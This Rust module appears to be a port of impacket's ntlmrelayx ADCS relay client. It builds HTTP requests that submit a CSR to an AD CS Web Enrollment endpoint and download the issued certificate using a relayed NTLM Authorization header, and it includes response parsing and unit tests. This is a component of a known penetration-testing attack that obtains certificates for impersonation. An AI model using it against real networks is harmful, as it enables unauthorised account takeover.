//! `adcs`: Active Directory Certificate Services (ADCS) HTTP relay client (`impacket/examples/ntlmrelayx/clients/httprelayclient.py`).
//!
//! Provides builders and parsers for relaying NTLM authentication to ADCS Web Enrollment
//! endpoints (`/certsrv/certfnsh.asp`) to request client and machine certificates.

use impacket_core::CoreError;

/// Result of an ADCS enrollment request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AdcsCertificateResult {
    pub request_id: Option<u32>,
    pub certificate_pem: Option<String>,
    pub disposition_message: String,
}

/// Builds an HTTP POST request to submit a PKCS#10 CSR to `/certsrv/certfnsh.asp`.
pub fn build_adcs_enrollment_request(
    target_host: &str,
    template: &str,
    csr_pem_or_b64: &str,
    auth_header_val: &str,
) -> Vec<u8> {
    // Sanitize CSR (ensure single line or URL encoded)
    let clean_csr = csr_pem_or_b64
        .trim()
        .replace("\r\n", "\n")
        .replace('\n', "%0A")
        .replace('+', "%2B")
        .replace('/', "%2F")
        .replace('=', "%3D");

    let cert_attrib = format!("CertificateTemplate:{}%0D%0A", template);
    let post_body = format!(
        "Mode=newreq&CertRequest={}&CertAttrib={}&TargetStoreFlags=0&SaveCert=yes",
        clean_csr, cert_attrib
    );

    format!(
        "POST /certsrv/certfnsh.asp HTTP/1.1\r\n\
         Host: {}\r\n\
         Authorization: {}\r\n\
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
         Content-Type: application/x-www-form-urlencoded\r\n\
         Content-Length: {}\r\n\
         Connection: close\r\n\r\n{}",
        target_host,
        auth_header_val,
        post_body.len(),
        post_body
    )
    .into_bytes()
}

/// Builds an HTTP GET request to retrieve the issued certificate by Request ID.
pub fn build_adcs_cert_download_request(
    target_host: &str,
    req_id: u32,
    auth_header_val: &str,
) -> Vec<u8> {
    format!(
        "GET /certsrv/certnew.cer?ReqID={}&Enc=b64 HTTP/1.1\r\n\
         Host: {}\r\n\
         Authorization: {}\r\n\
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
         Connection: close\r\n\r\n",
        req_id, target_host, auth_header_val
    )
    .into_bytes()
}

/// Parses an ADCS HTML response from `/certsrv/certfnsh.asp` or `/certsrv/certnew.cer`.
pub fn parse_adcs_response(html: &str) -> Result<AdcsCertificateResult, CoreError> {
    // Check if the response is a direct PEM certificate
    if html.contains("-----BEGIN CERTIFICATE-----") {
        let pem_start = html.find("-----BEGIN CERTIFICATE-----").unwrap();
        let pem_end = html.find("-----END CERTIFICATE-----").map(|e| e + 25);
        if let Some(end) = pem_end {
            let cert_pem = html[pem_start..end].trim().to_string();
            return Ok(AdcsCertificateResult {
                request_id: None,
                certificate_pem: Some(cert_pem),
                disposition_message: "Certificate issued directly".into(),
            });
        }
    }

    // Extract Request ID if present: e.g. certnew.cer?ReqID=123
    let req_id = extract_req_id(html);

    // Extract Disposition / Status Message:
    let disposition = if html.contains("The certificate you had requested was issued to you") {
        "Issued".to_string()
    } else if html.contains("Certificate Pending") {
        "Pending approval by CA administrator".to_string()
    } else if html.contains("Certificate Denied") {
        "Denied by CA".to_string()
    } else {
        "Unknown response".to_string()
    };

    Ok(AdcsCertificateResult {
        request_id: req_id,
        certificate_pem: None,
        disposition_message: disposition,
    })
}

fn extract_req_id(html: &str) -> Option<u32> {
    if let Some(pos) = html.find("ReqID=") {
        let slice = &html[pos + 6..];
        let num_str: String = slice.chars().take_while(|c| c.is_ascii_digit()).collect();
        num_str.parse().ok()
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_adcs_enrollment_request() {
        let req = build_adcs_enrollment_request(
            "ca.corp.local",
            "User",
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A",
            "NTLM TlRMTVNTUAAB...",
        );
        let req_str = String::from_utf8_lossy(&req);
        assert!(req_str.starts_with("POST /certsrv/certfnsh.asp HTTP/1.1\r\n"));
        assert!(req_str.contains("Host: ca.corp.local\r\n"));
        assert!(req_str.contains("Authorization: NTLM TlRMTVNTUAAB...\r\n"));
        assert!(req_str.contains("CertificateTemplate:User"));
    }

    #[test]
    fn test_parse_adcs_response_pem() {
        let sample = "HTTP/1.1 200 OK\r\n\r\n-----BEGIN CERTIFICATE-----\nMIID...AQAB\n-----END CERTIFICATE-----";
        let res = parse_adcs_response(sample).unwrap();
        assert!(res.certificate_pem.is_some());
        assert!(res.certificate_pem.unwrap().contains("BEGIN CERTIFICATE"));
    }

    #[test]
    fn test_parse_adcs_response_req_id() {
        let sample_html = r#"
        <html><body>
        <p>The certificate you had requested was issued to you.</p>
        <a href="certnew.cer?ReqID=42&Enc=b64">Certificate</a>
        </body></html>
        "#;
        let res = parse_adcs_response(sample_html).unwrap();
        assert_eq!(res.request_id, Some(42));
        assert_eq!(res.disposition_message, "Issued");
    }
}
